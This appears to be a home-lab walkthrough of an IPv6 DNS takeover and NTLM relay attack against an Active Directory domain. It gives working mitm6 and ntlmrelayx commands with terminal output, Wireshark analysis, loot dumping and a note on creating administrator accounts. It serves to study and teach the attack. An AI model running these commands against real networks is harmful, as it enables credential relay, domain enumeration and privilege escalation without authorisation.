
If mitm6 not yet installed
1. cd /opt/mitm6
2. sudo pip3 install .


How to initiate the attack?

1. Prepare the command `sudo mitm6 -d marvel.local`. Do not yet execute it as we will run ntlmrelayx first.
2. Execute `ntlmrelayx 6 -t ldaps://192.168.64.250 -wh fakewpad.marvel.local -escalate-user pparker` or `The Domain Computer requested wpad.dat file to the attacker's machine. based from the image, it successfully downloaded the wpad.dat.` - Sets up the relay server and WPAD host, ready to intercept and relay NTLM authentication.

```
└─$ impacket-ntlmrelayx -6 -t ldaps://192.168.64.250 -wh fakewpad.marvel.local -l lootme
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
[*] HTTPD(80): Client requested path: /wpad.dat
[*] HTTPD(80): Client requested path: /wpad.dat
[*] HTTPD(80): Serving PAC file to client fe80::fde3:206f:be61:b3b7
[*] HTTPD(80): Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD(80): Connection from fe80::fde3:206f:be61:b3b7 controlled, attacking target ldaps://192.168.64.250
[*] HTTPD(80): Authenticating against ldaps://192.168.64.250 as MARVEL/PUNISHER$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Dumping domain info for first time
[*] Domain info dumped into lootdir!
[*] HTTPD(80): Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD(80): Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD(80): Connection from fe80::fde3:206f:be61:b3b7 controlled, but there are no more targets left!
[*] HTTPD(80): Connection from fe80::fde3:206f:be61:b3b7 controlled, but there are no more targets left!
[*] HTTPD(80): Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409

```
3. Now execute the `sudo mitm6 -d marvel.local`

```
┌──(kali㉿kali)-[~]
└─$ sudo mitm6 -d marvel.local                                                          
[sudo] password for kali: 
Starting mitm6 using the following configuration:
Primary adapter: eth0 [ea:f0:2f:00:11:3a]
IPv4 address: 192.168.64.4
IPv6 address: fe80::e8f0:2fff:fe00:113a
DNS local search domain: marvel.local
DNS allowlist: marvel.local
IPv6 address fe80::913:1 is now assigned to mac=8e:27:0f:ff:34:d1 host=SPIDERMAN.MARVEL.local. ipv4=
Sent spoofed reply for wpad.MARVEL.local. to fe80::8c06:f13e:9fe4:6de1
Sent spoofed reply for wpad.MARVEL.local. to fe80::8c06:f13e:9fe4:6de1
Renew reply sent to fe80::913:1
IPv6 address fe80::192:168:64:220 is now assigned to mac=4e:4f:0d:0b:16:40 host=PUNISHER.MARVEL.local. ipv4=192.168.64.220
Sent spoofed reply for wpad.MARVEL.local. to fe80::fde3:206f:be61:b3b7
Sent spoofed reply for wpad.MARVEL.local. to fe80::fde3:206f:be61:b3b7
Sent spoofed reply for wpad.marvel.local. to fe80::fde3:206f:be61:b3b7
Sent spoofed reply for wpad.marvel.local. to fe80::fde3:206f:be61:b3b7
IPv6 address fe80::192:168:64:220 is now assigned to mac=4e:4f:0d:0b:16:40 host=PUNISHER.MARVEL.local. ipv4=192.168.64.220
Sent spoofed reply for fakewpad.marvel.local. to fe80::fde3:206f:be61:b3b7
Sent spoofed reply for fakewpad.marvel.local. to fe80::fde3:206f:be61:b3b7


```

4. After that,  a loot me file was saved in the /home/kali directory

Capturing, in the wireshark, here is the step by step

1. IPV6 router advertisement - The attacker/kali impersonates will introduce itself as an  IPV6 router
![[Pasted image 20240716203249.png]]
2. DHCPv6 Activity - After the domain computer reboots, it perform DHCPv6 solicitation in response to the new router advertisement. The Kali then offers link local and global address to the domain computer
![[Pasted image 20240716205537.png]]

3. After obtaining DHCPv6 address, it then query for WPAD(Web proxy auto discovery) . As you see below, the client queries for the IPv4 and IPv6 address of wpad.marvel.local and the attacker replies its IPv4 and IPV6 address saying he is the wpad(introduced fakewpad.marvel.local)
![[Pasted image 20240716213537.png]]

4. The Domain Computer acknowledged that the WPAD server is kali/attacker's IP. It will request the wpad.dat file to the attacker's machine via HTTP `GET`. Based on the image below, it successfully downloaded the wpad.dat.
`GET http://fakewpad.marvel.local/wpad.dat`
![[Pasted image 20240716221027.png]]

5.  The `wpad.dat` file contains JavaScript that instructs the host to use the attacker's (Kali's) machine as the proxy.
6. When the domain computer attempts to access the internet, it routes the HTTP request through the attacker's proxy as per the instructions in the `wpad.dat`. Please see image below[item 439]
7.  The attacker responds with 407 Proxy Authentication required, prompting the domain computer to send an NTLM authentication (NTLM Negotiate). In the image above, at item number 432, the attacker replied with HTTP/1.1 authentication is required. Please see image below [item 441]
9. The domain computer sends an NTLM Negotiate message to the attacker. Please see image below [item 445]

![[Pasted image 20240717195615.png]]

![[Pasted image 20240717195952.png]]

10. After the NTLM authentication was acquired, Kali sensed it immediately through ntlmxrelay and will communicate to the domain controller (192.168.64.250) with the relayed NTLM authentication. Please see the image below [item 447]
As you see, the domain controller and the kali has now 3-way handshake communication(downloading end enumerating sensitive infromation like domain users, domain computers) after authenticated to the domain controller.
![[Pasted image 20240718185833.png]]

- In the image below of Kali ntlmxrelay, you will see that the lootme file was created and all sensistive information has been stored there
![[Pasted image 20240717202044.png]]

![[Pasted image 20240717202220.png]]

11. Below is the lootme file that has been downloaded
![[Pasted image 20240718190953.png]]

![[Pasted image 20240718192929.png]]

![[Pasted image 20240718193014.png]]

12. It can also create an administrator account.